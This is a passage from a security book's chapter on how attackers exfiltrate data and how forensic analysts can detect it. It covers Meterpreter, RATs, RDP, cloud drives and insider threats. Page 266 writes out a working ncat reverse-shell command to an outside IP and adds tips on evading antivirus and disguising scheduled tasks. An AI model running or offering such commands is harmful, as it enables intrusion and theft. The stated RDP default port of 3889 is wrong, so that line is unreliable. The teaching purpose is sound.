- pgno: 262
  md: '![](img/181571ad74cba0e6a2f38fcd2658651e_262_0.png)


    # FIGURE 8.14 Encrypted Meterpreter traffic.


    When hackers use any type of encrypted transmission, it is going to be extremely
    difficult to pinpoint and reliably indicate what was taken (exfiltrated) out of
    the network. An analyst can provide data about what the destination IP Address
    is and how much data left the network, but not exactly what was stolen. The other
    thing to point out here is in the example I am using I know the IP Address of
    the attacker and victim when examining the traffic. Some large organizations may
    have terabytes of data go through their network in a short time frame. And Network
    traffic (PCAP files) is not always collected by all organizations. It can be a
    daunting task to have to sift through a large amount of data, and Wireshark cannot
    even manage very large PCAP files well, so you would have to filter the files
    even before inspecting them. Knowing the IP Address of the attacker from volatile
    data collection (covered in Chapter 9 – Am I hacked? How do I tell?) would certainly
    be a good starting point as a filter. A large amount of a company or organization’s
    data being exfiltrated to an IP Address in North Korea, China, or some other adversary
    is not a good sign.


    If you think terabytes of data being exfiltrated from the network is far-fetched,
    then you should be aware of what happened to the Pentagon in 2009. Based on the
    analysis of the attack, it is believed that the Chinese stole terabytes of data
    from the Pentagon. The data was related to the F-35 Fighter Jet and after the
    classified information was stolen, that put the United States military and pilots
    at greater risk.'
  merge: -1
  img_proc: true
- pgno: 263
  md: '![](img/181571ad74cba0e6a2f38fcd2658651e_263_0.png)


    **FIGURE 8.15**  Terabytes of data exfiltrated from the network ([homelandsecuritynewswire.com](http://homelandsecuritynewswire.com)).


    Due to the fact that the exfiltration could be (and likely is) fully encrypted,
    the forensic team might need to consider the possibility of looking at the digital
    artifacts on the compromised system. When I worked for an IR team, we would look
    for rar files as compressing the files and taking them out of the network is more
    efficient and less likely to activate various network sensors. And in my response
    and forensics gigs, I did not just look for a rar file on the disk. We would use
    WinHex (great tool) to search in slack space for rar files and most hackers are
    smart enough to delete their files prepared for exfil after they are stolen.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_263_1.png)


    **FIGURE 8.16**  RAR (or 7z) it up.


    You can also examine the MAC (not that MAC) Modified, Accessed, and Created of
    the files on the systems. While you may not be able to prove what encrypted data
    left the network, if there is a 4 GB RAR file created that stores your proprietary
    data and you see 4 GB of network traffic leave your network, it is fairly safe
    to “infer” what likely happened. When encryption is used to exfiltrate the network
    data, you can never say for sure what happened, but you can certainly look at
    the disks, logs, user activity, and time stamps to take an educated guess of what
    happened to the important data.


    Meterpreter is just one tool that can be used to take data out of the network.
    There are so many Remote Access Trojans (RAT) that use encrypted transmission.
    Many of them will have a File Manager where you can upload malware (send) or exfiltrate
    (receive) data from the network. You will notice that the interface used for file
    transfer on most of these RATs is similar to that of the WinSCP interface.'
  merge: -1
  img_proc: true
- pgno: 264
  md: '![](img/181571ad74cba0e6a2f38fcd2658651e_264_0.png)


    # FIGURE 8.17 Remote Access Trojan file manager.


    Just like with a Meterpreter connection from the attacker to the victim, most
    of these RATs use encryption. Like with msfconsole and msfvenom, you can choose
    which outbound port (like 443) you want the malware to beacon to. The Graphical
    User Interface (GUI) of most of these RATs makes it a little easier to navigate
    through the filesystem of the victim. Some in the hacker community have very (strange)
    passionate views about not using any GUI tools. Since many of these RATs were
    developed in foreign countries, I would venture to say that the overseas adversaries
    have no problem using them.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_264_1.png)


    # FIGURE 8.18 Encrypted RAT exfiltration.


    Speaking of encrypted communications used to steal your data, if attackers get
    your credentials, then they can always leverage Remote Desktop Connection. I have
    been leveraging Remote Desktop connection since it first appeared in Windows NT
    4 Terminal Services Edition. Nowadays, you will'
  merge: -1
  img_proc: true
- pgno: 265
  md: 'have the ability to enable RDP on Windows 11, Windows 10, Server 2022, Server
    2019, and many of the earlier operating systems back to Windows XP. A Remote Desktop
    connection allows you to connect to another desktop, usually over port 3889 (default),
    and you can then manage and administer the machine through the GUI. Some organizations
    allow this port through their firewalls, and if an attacker gets the credentials
    to the system, it can be game over. Credentials can be acquired in many ways like
    through a credential stuffing attack. Credential stuffing is where users tend
    to reuse usernames and passwords on work and personal accounts and a site they
    used is compromised and then those credentials are published on the Dark Web,
    Pastebin, etc. One of the nice features about RDP is you can select anything on
    the target machine and then copy and paste it to your local machine. The legitimate
    program from Microsoft has upload and download capabilities like RATs and Metasploit’s
    meterpreter but hackers will not have to worry about setting off Antivirus with
    this method of exfiltration. If RDP is allowed outbound from the network, a malicious
    insider could use this to exfiltrate company data.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_265_0.png)


    FIGURE 8.19 Remote desktop connection.


    Other methods of exfiltration include Google Drive, Dropbox, OneDrive, and so
    many other options. There are so many ways for an employee who has access (insider
    threat) to download malicious files and upload and exfiltrate the proprietary
    data of the company they are working for, it is difficult to prevent. I have heard
    of many cases of employees having their Microsoft accounts locked within minutes
    of termination, whether that termination was due to layoffs, firing, quitting,
    or early retirement.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_265_1.png)


    FIGURE 8.20 OneDrive.'
  merge: -1
  img_proc: true
- pgno: 266
  md: 'There are also some old-school ways for hackers to gain access to systems and
    steal data. One might ask, why would a hacker ever use a Linux shell or a Windows
    shell instead of using a Meterpreter payload?


    +   - Meterpreter is not always an available payload for every exploit within
    Metasploit

    +   - Meterpreter will often set off Antivirus, but a reverse shell should not

    +   - Meterpreter (for Windows) involves downloading a malicious Dynamic Link
    Library (DLL)

    +   - Although it is a reach, it has a smaller overall footprint within the network
    traffic.

    +   - Other tools besides Metasploit like ncat (from nmap) can be used to send
    a shell.


    The command I use is: start /b cmd /c ncat 175.45.176.200 443 -e cmd.exe


    ![](img/181571ad74cba0e6a2f38fcd2658651e_266_0.png)


    FIGURE 8.21 A Command Prompt sent to North Korea with AV running.


    In the example above, I am able to send a Command Prompt outbound from my system
    on an internal network to a North Korean IP Address with Antivirus (and the Firewall)
    turned on and fully updated. Sometimes it is about staying hidden and sometimes
    it is just more important to easily bypass AV. I could also use schtasks to create
    a task to perform this connection but that does leave forensic evidence in the
    scheduled task folder. The hacker can delete your scheduled tasks to remove that
    forensic evidence. A hacker might have an ongoing scheduled task making this type
    of outbound network connection. As the attacker, I love giving names like MicrosoftEdgeUpdateTaskMachineXX,
    GoogleUpdate, or something that almost matches a typical name of a legitimate
    scheduled task.


    ![](img/181571ad74cba0e6a2f38fcd2658651e_266_1.png)


    FIGURE 8.22 Scheduled tasks.


    While Meterpreter and many RATs will encrypt the outbound traffic, a command shell
    for Windows and Linux will be in plain text which will allow an analyst to view
    every command the attacker ran. If the traffic is saved by the organization and
    then can locate the command shell traffic, they will really have some good leads
    on where to look for forensic artifacts on the disk and be more likely to tell
    what data may have been lifted from the network. Stealing data with Meterpreter
    or a RAT is far easier than some of the techniques that the attacker will need
    to leverage just with access to a command shell.'
